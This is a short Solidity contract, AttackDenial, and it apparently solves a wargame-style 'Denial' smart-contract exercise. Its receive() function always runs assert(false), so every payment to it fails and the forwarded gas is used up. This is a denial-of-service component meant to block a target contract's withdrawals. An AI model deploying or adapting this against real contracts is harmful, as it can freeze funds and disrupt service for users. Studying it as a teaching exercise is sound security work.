// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackDenial {
  receive() external payable{
    assert(false);
  }
}
